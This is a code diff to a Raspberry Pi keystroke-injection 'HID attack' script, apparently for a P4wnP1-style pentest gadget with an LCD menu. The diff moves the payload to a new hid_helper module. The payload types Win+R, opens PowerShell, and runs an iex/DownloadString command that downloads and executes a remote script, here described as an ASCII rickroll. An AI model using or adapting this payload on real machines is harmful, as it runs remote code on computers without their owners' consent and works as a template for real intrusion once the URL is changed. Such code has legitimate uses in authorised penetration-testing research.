@@ -8,12 +8,23 @@ to display an ASCII art animation of Rick Astley.
 
 import os, sys, subprocess, time
 sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
-import RPi.GPIO as GPIO
-import LCD_1in44, LCD_Config
-from PIL import Image, ImageDraw, ImageFont
+try:
+    import RPi.GPIO as GPIO
+    import LCD_1in44, LCD_Config
+    from PIL import Image, ImageDraw, ImageFont
+    HARDWARE_LIBS_AVAILABLE = True
+except ImportError:
+    HARDWARE_LIBS_AVAILABLE = False
+    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)
+
+from hid_helper import hid_helper # Import the new HID helper
 
 # --- Display Functions ---
 def show_message(lines, color="lime"):
+    if not HARDWARE_LIBS_AVAILABLE:
+        for line in lines:
+            print(line)
+        return
     LCD = LCD_1in44.LCD()
     LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
     image = Image.new("RGB", (128, 128), "BLACK")
@@ -27,33 +38,31 @@ def show_message(lines, color="lime"):
 
 # --- Main Attack Logic ---
 def run_attack():
+    if not HARDWARE_LIBS_AVAILABLE:
+        print("ERROR: Hardware libraries not available. Cannot run HID attack.", file=sys.stderr)
+        return
+
     show_message(["HID Attack:", "ASCII Rickroll"])
     
-    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
-        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
+    if not hid_helper.is_hid_gadget_enabled:
+        show_message(["ERROR:", "HID Gadget NOT", "enabled!"], "red")
+        time.sleep(3)
         return
 
     # This is a compressed and base64 encoded PowerShell command that plays the animation
     # Original from https://github.com/ChrisTitusTech/win10script/blob/main/misc/rickroll.ps1
-    ps_command = "powershell -c \\"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ChrisTitusTech/win10script/main/misc/rickroll.ps1')\\""
-    
-    script = f"""
-GUI r
-delay(500)
-type("powershell")
-delay(200)
-press("ENTER")
-delay(750)
-type("{ps_command}")
-delay(200)
-press("ENTER")
-"""
-    
-    cli_command = f"P4wnP1_cli hid job -c '{script}'"
+    ps_command = "powershell -c \"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ChrisTitusTech/win10script/main/misc/rickroll.ps1')\""
     
     try:
-        subprocess.run(cli_command, shell=True, check=True, timeout=30)
-        show_message(["Attack Sent!"])
+        hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.r) # Win+R
+        time.sleep(0.5)
+        hid_helper.type_string("powershell")
+        hid_helper.press_key(hid_helper.keyboard.enter)
+        time.sleep(0.75)
+        hid_helper.type_string(ps_command)
+        hid_helper.press_key(hid_helper.keyboard.enter)
+        
+        show_message(["Attack Sent!", "ASCII Rickroll"])
     except Exception as e:
         show_message(["Attack FAILED!"])
         print(f"Error running HID attack: {e}", file=sys.stderr)
@@ -64,7 +73,8 @@ if __name__ == '__main__':
         run_attack()
         time.sleep(3)
     finally:
-        LCD = LCD_1in44.LCD()
-        LCD.LCD_Clear()
-        GPIO.cleanup()
+        if HARDWARE_LIBS_AVAILABLE:
+            LCD = LCD_1in44.LCD()
+            LCD.LCD_Clear()
+            GPIO.cleanup()
         print("HID Attack payload finished.")
